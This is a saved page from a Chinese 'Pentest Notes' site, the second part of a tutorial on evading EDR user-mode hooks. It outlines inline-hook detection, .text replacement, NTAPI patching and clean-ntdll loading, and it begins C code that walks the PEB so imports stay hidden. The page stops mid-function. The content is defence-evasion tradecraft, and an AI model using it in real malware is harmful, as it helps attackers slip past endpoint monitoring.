<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="2. 绕过用户态Hooking # 在上个小节，我们讨论了 EDR 在用户态设置 Hook 的原理，那么相应地，我们可以根据这原理寻找间隙，实现对用户态 Hook 的绕过。截至目前，已经有多种方法绕过 Hook。不过，Hook 并非 EDR 的全部检测能力的来源，因此绕过 Hook 的这个过程本身可能就会被检测为恶意。不过无论如何，在这个小节，我们会过一下常见的一些用于绕过 Hook 的方法，以及它们的 IOC。在下个小节，我们会继续探讨绕过用户态 Hook 的方法，虽然会更加复杂一些。
检测内联 Hook # 内联 Hook 的实施是在要 Hook 的 NTAPI 的 syscall stub 中的 syscall 指令之前用无条件跳转指令覆盖原有指令。不同的 EDR 可能会覆盖不同的指令，例如 CrowdStrike 覆盖的是 mov eax, SSN 这条指令，有的 EDR 覆盖的是 mov r10, rcx 这条指令。
因此，代码的逻辑便很直接，逐一检查 syscall stub 的前 4 个字节。在代码里，我们通过 PEB Walking 的方法在不调用 LoadLibray，GetModuleHandle，GetProcAddress 函数的情况下可以获得 ntdll 模块的地址、给定函数的地址。这么做可以避免 LoadLibray，GetModuleHandle，GetProcAddress 这些函数在 IAT 中的显示。
因为涉及对模块的解析，因此我们也会频繁用到 PE 文件相关的结构体。">
<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/%E5%85%B6%E4%BB%96/Hooking/2.%E7%BB%95%E8%BF%87%E7%94%A8%E6%88%B7%E6%80%81Hooking/">
  <meta property="og:site_name" content="Pentest Notes">
  <meta property="og:title" content="Pentest Notes">
  <meta property="og:description" content="2. 绕过用户态Hooking # 在上个小节，我们讨论了 EDR 在用户态设置 Hook 的原理，那么相应地，我们可以根据这原理寻找间隙，实现对用户态 Hook 的绕过。截至目前，已经有多种方法绕过 Hook。不过，Hook 并非 EDR 的全部检测能力的来源，因此绕过 Hook 的这个过程本身可能就会被检测为恶意。不过无论如何，在这个小节，我们会过一下常见的一些用于绕过 Hook 的方法，以及它们的 IOC。在下个小节，我们会继续探讨绕过用户态 Hook 的方法，虽然会更加复杂一些。
检测内联 Hook # 内联 Hook 的实施是在要 Hook 的 NTAPI 的 syscall stub 中的 syscall 指令之前用无条件跳转指令覆盖原有指令。不同的 EDR 可能会覆盖不同的指令，例如 CrowdStrike 覆盖的是 mov eax, SSN 这条指令，有的 EDR 覆盖的是 mov r10, rcx 这条指令。
因此，代码的逻辑便很直接，逐一检查 syscall stub 的前 4 个字节。在代码里，我们通过 PEB Walking 的方法在不调用 LoadLibray，GetModuleHandle，GetProcAddress 函数的情况下可以获得 ntdll 模块的地址、给定函数的地址。这么做可以避免 LoadLibray，GetModuleHandle，GetProcAddress 这些函数在 IAT 中的显示。
因为涉及对模块的解析，因此我们也会频繁用到 PE 文件相关的结构体。">
  <meta property="og:locale" content="zh-cn">
  <meta property="og:type" content="article">
  <meta property="article:section" content="docs">
<title>2.绕过用户态 Hooking | Pentest Notes</title>
<link rel="manifest" href="/manifest.json">
<link rel="icon" href="/favicon.png" >
<link rel="canonical" href="http://localhost:1313/docs/%E5%85%B6%E4%BB%96/Hooking/2.%E7%BB%95%E8%BF%87%E7%94%A8%E6%88%B7%E6%80%81Hooking/">
<link rel="stylesheet" href="/book.min.599079e474050c6bea85d1008bc631728c5ad956088cb0958f2056ed345f0196.css" integrity="sha256-WZB55HQFDGvqhdEAi8Yxcoxa2VYIjLCVjyBW7TRfAZY=" crossorigin="anonymous">
  <script defer src="/flexsearch.min.js"></script>
  <script defer src="/en.search.min.be3cb6062ad734487c8dd12d9a0644f0e72a4160ed8d460fa6f4cbb2c2b005a6.js" integrity="sha256-vjy2BirXNEh8jdEtmgZE8OcqQWDtjUYPpvTLssKwBaY=" crossorigin="anonymous"></script>

  

<!--
Made with Book Theme
https://github.com/alex-shpak/hugo-book
-->
  
</head>
<body dir="ltr">
  <input type="checkbox" class="hidden toggle" id="menu-control" />
  <input type="checkbox" class="hidden toggle" id="toc-control" />
  <main class="container flex">
    <aside class="book-menu">
      <div class="book-menu-content">
        
  <nav>
<h2 class="book-brand">
  <a class="flex align-center" href="/"><span>Pentest Notes</span>
  </a>
</h2>


<div class="book-search">
  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
  <div class="book-search-spinner hidden"></div>
  <ul id="book-search-results"></ul>
</div>












  



  
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Amass/" class="">Amass</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/Linux%E5%86%85%E9%83%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="">Linux内部信息收集</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E4%B8%BB%E6%9C%BA%E6%89%AB%E6%8F%8F/" class="">主机扫描</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%89%AB%E6%8F%8F/" class="">子域名扫描</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/" class="">定时任务</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F/" class="">目录扫描</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%85%B6%E4%BB%96/Hooking/1.%E7%94%A8%E6%88%B7%E6%80%81Hooking%E4%BB%8B%E7%BB%8D/" class="">1.用户态 Hooking介绍</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%85%B6%E4%BB%96/Hooking/2.%E7%BB%95%E8%BF%87%E7%94%A8%E6%88%B7%E6%80%81Hooking/" class="active">2.绕过用户态 Hooking</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%85%B6%E4%BB%96/Hooking/3.%E8%B0%83%E7%94%A8syscall%E5%AE%9E%E7%8E%B0%E7%94%A8%E6%88%B7%E6%80%81Hook%E7%BB%95%E8%BF%87/" class="">3.调用syscall实现用户态 Hook绕过</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%85%B6%E4%BB%96/HVV%E9%9D%A2%E8%AF%95/" class="">Hvv面试</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%85%B6%E4%BB%96/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/" class="">解决ubuntu Crontab反弹shell失败的问题</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AD%E5%9F%9F/ADSEC101/" class="">Adsec101</a>
  

        </li>
      
    
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AD%E5%9F%9F/Kerbrute/" class="">Kerbrute</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AD%E5%9F%9F/KeyTab/" class="">Key Tab</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AD%E5%9F%9F/runas/" class="">Runas</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AD%E5%9F%9F/Windows%E5%86%85%E9%83%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="">Windows内部信息收集</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AD%E5%9F%9F/%E5%B1%80%E5%9F%9F%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="">局域网信息收集</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AD%E5%9F%9F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/IPC/" class="">IP C</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AD%E5%9F%9F/%E7%9B%B8%E5%85%B3%E8%B5%84%E6%96%99/" class="">相关资料</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/" class="">代理转发</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/" class="">容器逃逸</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%AF%86%E7%A0%81%E6%94%B6%E9%9B%86/" class="">密码收集</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/" class="">扫描工具</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93/" class="">文件传输</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E7%9B%B8%E5%85%B3%E6%96%87%E7%AB%A0/" class="">相关文章</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/CS%E9%9A%90%E5%8C%BF/CobaltStrike&#43;CDN/" class="">Cobalt Strike Cdn</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E5%85%8D%E6%9D%80/PHP%E5%86%85%E5%AD%98%E9%A9%AC/" class="">Php内存马</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E5%85%8D%E6%9D%80/WebShell%E5%85%8D%E6%9D%80/" class="">Web Shell免杀</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E5%85%8D%E6%9D%80/%E5%85%8D%E6%9D%80/" class="">免杀</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%83/" class="">Linux提权</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E6%8F%90%E6%9D%83/MySQL%E6%8F%90%E6%9D%83/" class="">My Sql提权</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E6%8F%90%E6%9D%83/SQLServer%E6%8F%90%E6%9D%83/" class="">SQL Server提权</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%94%BB%E5%87%BB%E6%89%A7%E8%A1%8C/%E8%BF%9C%E6%8E%A7/%E4%BC%98%E5%8C%96shell/" class="">优化shell</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/Java/Fastjson/" class="">Fastjson</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/Java/Shiro/" class="">Shiro</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/pear&#43;register_argc_argv%E5%88%A9%E7%94%A8/" class="">Pear Register Argc Argv利用</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="">Php伪协议</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/PHP%E5%86%85%E7%BD%AE%E7%B1%BB/" class="">Php内置类</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="">Php反序列化漏洞</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="">Php命令执行</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/PHP%E5%9F%BA%E7%A1%80/" class="">Php基础</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/PHP%E7%89%B9%E6%80%A7%E5%A4%A7%E5%85%A8%E4%B8%8D%E5%AE%8C%E6%95%B4/" class="">Php特性大全（不完整</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/PHP/%E6%97%A0%E5%8F%82%E6%95%B0RCE/" class="">无参数 Rce</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/SSRF/" class="">Ssrf</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/SSTI/PHP-Twig/" class="">Php Twig</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/SSTI/SSTI/" class="">Ssti</a>
  

        </li>
      
    
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/WordPress/" class="">Word Press</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="">信息泄露</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/" class="">命令执行绕过</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/NoSQLi/" class="">No Sqli</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/SQLi/" class="">Sqli</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/SQLi%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87/" class="">Sqli过滤绕过</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/sqlmap%E8%84%9A%E6%9C%AC/" class="">Sqlmap脚本</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/%E5%90%84%E7%89%88%E6%9C%AC%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%AD%E5%8F%A5/" class="">各版本数据库语句</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/HTTP_content-type_%E5%AF%B9%E7%85%A7%E8%A1%A8/" class="">HTTP Content Type 对照表</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="">文件上传</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/1.Web%E5%AE%89%E5%85%A8/%E6%97%A5%E5%BF%97%E5%AE%A1%E8%AE%A1/" class="">日志审计</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/motd/" class="">Motd</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/MySQL/" class="">My SQL</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/Redis/" class="">Redis</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/smb/" class="">Smb</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/VNC/" class="">Vnc</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/2.%E6%9C%8D%E5%8A%A1%E5%AE%89%E5%85%A8/webdav/" class="">Webdav</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/3.FUZZ/FUZZ/" class="">Fuzz</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/3.FUZZ/%E7%88%86%E7%A0%B4%E5%B7%A5%E5%85%B7/" class="">爆破工具</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/4.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E5%AE%A1%E8%AE%A1/CodeQL-Java/" class="">Code Ql Java</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/4.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E5%AE%A1%E8%AE%A1/SQL%E6%B3%A8%E5%85%A5/" class="">Sql注入</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/4.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP%E5%AE%A1%E8%AE%A1/SQL%E6%B3%A8%E5%85%A5/" class="">Sql注入</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/4.%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%B7%A5%E5%85%B7/" class="">工具</a>
  

        </li>
      
    
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0/5.%E6%BC%8F%E6%89%AB%E5%B7%A5%E5%85%B7/searchsploit/" class="">Searchsploit</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/%E7%BA%A2%E9%98%9F%E8%A1%8C%E5%8A%A8/%E7%BA%A2%E9%98%9F%E9%9D%A2%E8%AF%95/" class="">红队面试</a>
  

        </li>
      
    
  </ul>















</nav>




  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>


 
      </div>
    </aside>

    <div class="book-page">
      <header class="book-header">
        
  <div class="flex align-center justify-between">
  <label for="menu-control">
    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
  </label>

  <strong>2.绕过用户态 Hooking</strong>

  <label for="toc-control">
    
    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
    
  </label>
</div>


  
  <aside class="hidden clearfix">
    
  
<nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#检测内联-hook"><strong>检测内联 Hook</strong></a></li>
        <li><a href="#替换-text-节"><strong>替换 .text 节</strong></a></li>
        <li><a href="#补丁-ntapi"><strong>补丁 NTAPI</strong></a></li>
        <li><a href="#从挂起的进程中载入纯净-ntdll-模块"><strong>从挂起的进程中载入纯净 ntdll 模块</strong></a></li>
      </ul>
    </li>
  </ul>
</nav>



  </aside>
  
 
      </header>

      
      
  <article class="markdown book-article"><h1 id="2-绕过用户态hooking">
  2. 绕过用户态Hooking
  <a class="anchor" href="#2-%e7%bb%95%e8%bf%87%e7%94%a8%e6%88%b7%e6%80%81hooking">#</a>
</h1>
<p>在上个小节，我们讨论了 EDR 在用户态设置 Hook 的原理，那么相应地，我们可以根据这原理寻找间隙，实现对用户态 Hook 的绕过。截至目前，已经有多种方法绕过 Hook。不过，Hook 并非 EDR 的全部检测能力的来源，因此绕过 Hook 的这个过程本身可能就会被检测为恶意。不过无论如何，在这个小节，我们会过一下常见的一些用于绕过 Hook 的方法，以及它们的 IOC。在下个小节，我们会继续探讨绕过用户态 Hook 的方法，虽然会更加复杂一些。</p>
<h3 id="检测内联-hook">
  <strong>检测内联 Hook</strong>
  <a class="anchor" href="#%e6%a3%80%e6%b5%8b%e5%86%85%e8%81%94-hook">#</a>
</h3>
<p>内联 Hook 的实施是在要 Hook 的 NTAPI 的 syscall stub 中的 syscall 指令之前用无条件跳转指令覆盖原有指令。不同的 EDR 可能会覆盖不同的指令，例如 CrowdStrike 覆盖的是 <strong>mov eax, SSN</strong> 这条指令，有的 EDR 覆盖的是 <strong>mov r10, rcx</strong> 这条指令。</p>
<p>因此，代码的逻辑便很直接，逐一检查 syscall stub 的前 4 个字节。在代码里，我们通过 PEB Walking 的方法在不调用 LoadLibray，GetModuleHandle，GetProcAddress 函数的情况下可以获得 ntdll 模块的地址、给定函数的地址。这么做可以避免 LoadLibray，GetModuleHandle，GetProcAddress 这些函数在 IAT 中的显示。</p>
<p>因为涉及对模块的解析，因此我们也会频繁用到 PE 文件相关的结构体。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;winternl.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//Get module handle for ntdll and kernel32 at the same time
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">GetModule</span>(HMODULE<span style="color:#f92672">*</span> ntdll, HMODULE<span style="color:#f92672">*</span> kernel32)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> PPEB peb <span style="color:#f92672">=</span> (PPEB)(<span style="color:#a6e22e">__readgsqword</span>(<span style="color:#ae81ff">0x60</span>));
</span></span><span style="display:flex;"><span> PPEB_LDR_DATA ldr <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PPEB_LDR_DATA<span style="color:#f92672">*</span>)((PBYTE)peb <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x18</span>); <span style="color:#75715e">//PPEB_LDR_DATA pLdr = pPeb-&gt;Ldr;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span> PLIST_ENTRY ntdlllistentry <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PLIST_ENTRY<span style="color:#f92672">*</span>)((PBYTE)ldr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x30</span>);
</span></span><span style="display:flex;"><span> <span style="color:#f92672">*</span>ntdll <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(HMODULE<span style="color:#f92672">*</span>)((PBYTE)ntdlllistentry <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>);
</span></span><span style="display:flex;"><span> PLIST_ENTRY kernelbaselistentry <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PLIST_ENTRY<span style="color:#f92672">*</span>)((PBYTE)ntdlllistentry);
</span></span><span style="display:flex;"><span> PLIST_ENTRY kernel32listentry <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PLIST_ENTRY<span style="color:#f92672">*</span>)((PBYTE)kernelbaselistentry);
</span></span><span style="display:flex;"><span> <span style="color:#f92672">*</span>kernel32 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(HMODULE<span style="color:#f92672">*</span>)((PBYTE)kernel32listentry <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">CheckFuncByName</span>(IN HMODULE hModule, <span style="color:#66d9ef">const</span> CHAR <span style="color:#f92672">*</span> funcName)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span> PBYTE pBase <span style="color:#f92672">=</span> (PBYTE)hModule;
